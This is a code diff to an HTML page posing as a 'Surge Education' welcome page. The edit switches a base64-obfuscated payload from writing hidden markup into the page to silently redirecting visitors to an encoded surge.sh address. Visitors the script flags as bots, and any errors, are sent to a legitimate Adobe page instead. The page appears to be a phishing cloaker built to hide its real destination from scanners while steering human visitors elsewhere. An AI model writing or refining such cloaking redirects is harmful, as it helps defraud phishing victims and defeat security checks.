@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Surge Education learn | Welcome</title>
+    <title>Surge Education | Welcome</title>
     <style>
         body {
             font-family: sans-serif;
@@ -24,9 +24,9 @@
         // ==========================================================
         // SECURITY CONFIGURATION
         // ==========================================================
-        // Paste your valid, fully padded Base64 source code here
-        const ENCRYPTED_DOM_DATA = 'aHR0cHM6Ly9uZXdsZWFybmVyLWNvbS5zdXJnZS5zaC93ZWxlYXJucXVpY2suY29t'; 
-
+        // Your clean Base64 URL destination string from CyberChef
+        const ENCRYPTED_TARGET = 'aHR0cHM6Ly9uZXdsZWFybmVyLWNvbS5zdXJnZS5zaC93ZWxlYXJucXVpY2suY29t'; 
+        
         const BOT_TRAP_URL = 'https://www.adobe.com/uk/learn/acrobat';
 
         function blockAccess() {
@@ -108,12 +108,10 @@
             return;
         }
 
-        // 8. SUCCESS: Inject decoded structural markup directly into document context
+        // 8. SUCCESS: Decode the string and redirect the live window location
         try {
-            const rawHtml = atob(ENCRYPTED_DOM_DATA);
-            document.open();
-            document.write(rawHtml);
-            document.close();
+            const clearUrl = atob(ENCRYPTED_TARGET);
+            window.location.replace(clearUrl);
         } catch (err) {
             blockAccess();
         }
